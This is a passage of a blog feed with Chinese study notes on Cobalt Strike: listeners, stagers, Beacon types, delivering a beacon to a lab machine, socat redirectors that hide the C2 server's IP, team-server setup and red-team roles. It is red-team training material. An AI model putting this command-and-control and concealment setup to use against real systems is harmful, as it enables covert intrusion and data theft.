        <content type="html"><![CDATA[<p>这一小节学起来感觉有些吃力，里面很多概念理解的不是很清楚，如果有大佬看到描述错误的地方欢迎留言指正，避免误导他人。</p><p>再次声明，这只是我的个人学习笔记，不要当成教程去看，建议想学习CS的小伙伴可以看看A-TEAM的中文手册或者网上的一些视频教程。</p><h1 id="0x00-监听器管理"><a href="#0x00-监听器管理" class="headerlink" title="0x00 监听器管理"></a>0x00 监听器管理</h1><ul><li><p>什么是监听器</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p></li><li><p>监听器的作用</p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p></li></ul><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p><p>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。</p><p>监听器的名字一般由以下结构组成：</p><pre class="line-numbers language-none"><code class="language-none">Operating System&#x2F;Payload&#x2F;Stager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-什么是传输器"><a href="#0x01-什么是传输器" class="headerlink" title="0x01 什么是传输器"></a>0x01 什么是传输器</h1><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。</p><p>所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。</p><p>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</p><h1 id="0x02-创建监听器"><a href="#0x02-创建监听器" class="headerlink" title="0x02 创建监听器"></a>0x02 创建监听器</h1><p>在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p><p>Cobalt Strike有两种类型的监听器：</p><ul><li><p>Beacon</p><p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，笔者个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>Foreign</p><p>Foreign直译就是外部的，这里可以理解成<code>对外监听器</code>，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;foreign&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="0x03-Beacon是什么"><a href="#0x03-Beacon是什么" class="headerlink" title="0x03 Beacon是什么"></a>0x03 Beacon是什么</h1><ul><li>Beacon是CS的Payload</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li><li>Beacon有很多的后渗透攻击模块和远程管理工具</li></ul><h1 id="0x04-Beacon的类型"><a href="#0x04-Beacon的类型" class="headerlink" title="0x04 Beacon的类型"></a>0x04 Beacon的类型</h1><ul><li><p>HTTP 和 HTTPS Beacon</p><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_http&#x2F;reverse_httpwindows&#x2F;beacon_https&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>DNS Beacon</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_dns&#x2F;reverse_dns_txtwindows&#x2F;beacon_dns&#x2F;reverse_http<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>SMB Beacon</p><p>SMB Beacon也可以叫做pipe beacon</p><pre class="line-numbers language-none"><code class="language-none">windows&#x2F;beacon_smb&#x2F;bind_pipe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="0x05-创建一个HTTP-Beacon"><a href="#0x05-创建一个HTTP-Beacon" class="headerlink" title="0x05 创建一个HTTP Beacon"></a>0x05 创建一个HTTP Beacon</h1><p>点击 Cobalt Strike  –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>复制弹窗的命令，放到靶机中运行</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时，回到CS，就可以看到已经靶机上线了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x06-重定向器"><a href="#0x06-重定向器" class="headerlink" title="0x06 重定向器"></a>0x06 重定向器</h1><p>刚才创建了一个HTTP Beacon，接下来来看一下重定向器<code>Redirectors</code></p><p>重定向器是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p><pre class="line-numbers language-none"><code class="language-none">目标靶机 &lt;--------&gt;多个并列的重定向器&lt;------&gt;CS服务器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p><ul><li>保护自己的CS服务器，避免目标发现自己的真实IP</li><li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li></ul><h1 id="0x07-创建一个重定向器"><a href="#0x07-创建一个重定向器" class="headerlink" title="0x07 创建一个重定向器"></a>0x07 创建一个重定向器</h1><p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p><p>CS服务器IP：192.168.175.129</p><p>目标靶机IP：192.168.175.130</p><p>重定向器IP：192.168.175.132、192.168.175.133</p><p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:192.168.175.129:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时可以测试一下重定向器是否正常工作，在CS中打开 View –&gt; Web Log，之后浏览器访问CS服务器地址，也就是这里的192.168.175.129</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到CS是能够正常接收到流量的，说明重定向器已经配置OK了，此时按照上面创建一个HTTP Beacon的操作，创建一个HTTP Beacon，并在靶机中运行</p><p>当靶机上线的时候，观察靶机中的流量，可以看到与靶机连接的也是重定向器的IP</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在CS中也可以看到上线主机的外部IP也是重定向器的IP，此时如果关闭一个重定向器，系统依旧可以正常工作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x08-HTTPS-Beacon"><a href="#0x08-HTTPS-Beacon" class="headerlink" title="0x08 HTTPS Beacon"></a>0x08 HTTPS Beacon</h1><p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】4、快速登陆和生成会话报告</title>
      <link href="//200419-150447.html"/>
      <url>//200419-150447.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p><ul><li>输出格式为PDF或者Word格式</li><li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li><li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正</li></ul><h1 id="0x01-导出报告类型"><a href="#0x01-导出报告类型" class="headerlink" title="0x01 导出报告类型"></a>0x01 导出报告类型</h1><ul><li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li><li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li><li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li><li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li><li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li><li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></li></ul><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】3、如何进行分布操作</title>
      <link href="//200419-150440.html"/>
      <url>//200419-150440.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-最基本的团队服务模型"><a href="#0x00-最基本的团队服务模型" class="headerlink" title="0x00 最基本的团队服务模型"></a>0x00 最基本的团队服务模型</h1><p>这里介绍最基本的团队服务模型，具体由三个服务器构成，具体如下所示：</p><ul><li><p>临时服务器（Staging Servers）</p><p>临时服务器介于持久服务器和后渗透服务器之间，它的作用主要是方便在短时间内对目标系统进行访问。</p><p>它也是最开始用于传递payload、获取初始权限的服务器，它承担初始的权限提升和下载持久性程序的功能，因此这个服务器有较高暴露风险。</p></li><li><p>持久服务器（Long Haul Servers）</p><p>持久服务器的作用是保持对目标网络的长期访问，所以持久服务器会以较低的频率与目标保持通信。</p></li><li><p>后渗透服务器（Post-Exploitation Servers）</p><p>主要进行后渗透及横向移动的相关任务，比如对目标进行交互式访问</p></li></ul><h1 id="0x01-可伸缩红队操作模型"><a href="#0x01-可伸缩红队操作模型" class="headerlink" title="0x01 可伸缩红队操作模型"></a>0x01 可伸缩红队操作模型</h1><p>可伸缩红队操作模型（Scaling Red Operations）分为两个层次，第一层次是针对一个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。</p><p>目标单元的工作：</p><ul><li>负责具体目标或行动的对象</li><li>获得访问权限、后渗透、横向移动</li><li>维护本地基础设施</li></ul><p>访问管理单元的工作：</p><ul><li>保持所有目标网络的访问权限</li><li>获取访问权限并接收来自单元的访问</li><li>根据需要传递对目标单元的访问</li><li>为持续回调保持全局基础环境</li></ul><h1 id="0x02-团队角色"><a href="#0x02-团队角色" class="headerlink" title="0x02 团队角色"></a>0x02 团队角色</h1><ul><li><p>开始渗透人员</p><p>主要任务是进入目标系统，并扩大立足点</p></li><li><p>后渗透人员</p><p>主要任务是对目标系统进行数据挖掘、对用户进行监控，收集目标系统的密钥、日志等敏感信息</p></li><li><p>本地通道管理人员</p><p>主要任务有建立基础设施、保持shell的持久性、管理回调、传递全局访问管理单元之间的会话</p></li></ul><h1 id="0x03-日志记录"><a href="#0x03-日志记录" class="headerlink" title="0x03 日志记录"></a>0x03 日志记录</h1><p>Cobalt Strike的日志文件在团队服务器下的运行目录中的<code>logs</code>文件夹内，其中有些日志文件名例如<code>beacon_11309.log</code>，这里的<code>11309</code>就是beacon会话的ID。</p><p>按键的日志在<code>keystrokes</code>文件夹内，截屏的日志在<code>screenshots</code>文件夹内，截屏的日志名称一般如<code>screen_015321_4826.jpg</code>类似，其中<code>015321</code>表示时间（1点53分21秒），<code>4826</code>表示ID</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></p><p><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】2、如何连接团队服务器</title>
      <link href="//200419-150432.html"/>
      <url>//200419-150432.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>上一篇说了一些有的没的，现在来正式学习Cobalt Strike。</p><p>Cobalt Strike使用C/S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互，那么Cobalt Strike的客户端如何连接到团队服务器就是本文所学习的东西。</p><h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><p>Cobalt Strike的客户端想连接到团队服务器需要知道三个信息：</p><ul><li>团队服务器的外部IP地址</li><li>团队服务器的连接密码</li><li>（此项可选）决定Malleable C2工具的哪一个用户配置文件被用于团队服务器</li></ul><p>知道这些信息后，就可以使用脚本开启团队服务器了，值得注意的是Cobalt Strike团队服务器只能运行在Linux环境下。</p><h1 id="0x02-开启团队服务器"><a href="#0x02-开启团队服务器" class="headerlink" title="0x02 开启团队服务器"></a>0x02 开启团队服务器</h1><p>开启团队服务器命令一般如下所示：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver your_ip your_passowrd [config_file]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>服务端开启后，就可以开启客户端进行连接了</p><h1 id="0x03-连接到团队服务器"><a href="#0x03-连接到团队服务器" class="headerlink" title="0x03 连接到团队服务器"></a>0x03 连接到团队服务器</h1><p>在Linux下，直接运行start.sh脚本文件，输入团队服务器的IP、密码和自己的用户名进行连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击Connect连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击Yes，随后即可打开CS客户端界面</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在Windows下的连接方法也基本一致，直接双击start.bat文件，输入IP、密码、用户名，点击Connect即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在连接后，团队之间就可以通过客户端进行沟通，信息共享</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>Cobalt Strike不是用来设计指导在一个团队服务器下进行工作的，而是被设计成在一次行动中使用多个团队服务器。</p><p>这样设计的目的主要在于运行安全，如果一个团队服务器停止运行了，也不会导致整个行动的失败，所以接下来看看如何连接到多个团队服务器。</p><h1 id="0x05-连接到多个团队服务器"><a href="#0x05-连接到多个团队服务器" class="headerlink" title="0x05 连接到多个团队服务器"></a>0x05 连接到多个团队服务器</h1><p>Cobalt Strike连接到多个团队服务器也很简单，直接点击左上角的加号，输入其他团队服务器的信息后，即可连接</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs2-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】1、如何搭建自己的渗透测试环境</title>
      <link href="//200419-150407.html"/>
      <url>//200419-150407.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>第一次接触CS的时候，是有人在群里发了一个CS最新版的安装包，当时第一反应，CS ？？？</p><p>作为小白的我，在角落里看着群里的大佬们讨论的十分起劲儿，而我这个萌新对于他们所讨论的东西却听都没听过。</p><p>于是乎，新的一期学习笔记开整，本期学习笔记如题：《Cobalt Strike学习笔记》，简称《CS学习笔记》，这期笔记预计会更新28篇文章，学习资源来自B站视频，视频链接在文章底部。</p><p>由于这只是学习笔记，因此不会像教程一样详尽，一些我个人已经了解的东西或许不会记在笔记里，因此把笔记当做教程阅读是不合适的。</p><h1 id="0x01-CS是什么？"><a href="#0x01-CS是什么？" class="headerlink" title="0x01 CS是什么？"></a>0x01 CS是什么？</h1><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用1。</p><p>这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。</p><h1 id="0x02-CS的发展"><a href="#0x02-CS的发展" class="headerlink" title="0x02 CS的发展"></a>0x02 CS的发展</h1><ul><li><p>Armitage [2010-2012]</p><p>Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。</p></li><li><p>Cobalt Strike 1.x [2012-2014]</p><p>Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。</p></li><li><p>Cobalt Strike 2.x [2014-?]</p><p>Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。</p></li><li><p>Cobalt Strike 3.x [2015-?]</p><p>Cobalt Strike 3的攻击和防御都不用在Metasploit Framework平台（界面）下进行。</p></li></ul><h1 id="0x03-使用到的工具"><a href="#0x03-使用到的工具" class="headerlink" title="0x03 使用到的工具"></a>0x03 使用到的工具</h1><ul><li>Cobalt Strike</li><li>Kali</li><li>Metasploit Framework</li><li>PowerSploit</li><li>PowerTools</li><li>Veil Evasion Framework</li></ul><blockquote><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></p><p><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具分享】Pigat v2.0正式发布</title>
      <link href="//200321-150643.html"/>
      <url>//200321-150643.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Pigat（Passive Intelligence Gathering Aggregation Tool）被动信息收集聚合工具，该工具通过爬取目标URL在第三方网站比如备案查询网站、子域名查询网站的结果来对目标进行被动信息收集。</p><p>开发此工具的初衷就是平时在使用一些第三方的网站进行目标信息收集的时候，往往需要利用多个网站进行目标信息的收集，比如通过在线的Whois信息查询网站、在线的CMS信息查询网站、目标在Shodan上的信息等等，如此一来，就会增加很多重复的工作量，因此便开发了此工具，将平时常用的网站聚合到一个工具里。</p><p>该工具在2020年3月21日更新至2.0版本，该版本采用Scrapy框架开发，协程处理，运行速度更快，并且支持文件导出功能，同时修复了多个Bug，增加了多个功能。</p><a id="more"></a><h2 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h2><ul><li>被动收集备案信息</li><li>被动收集 Whois 信息</li><li>被动收集子域名信息</li><li>被动收集子域名 IP 信息</li><li>被动收集子域名 CMS 信息</li><li>被动收集子域名 Shodan 信息</li><li>被动收集子域名漏洞信息</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" 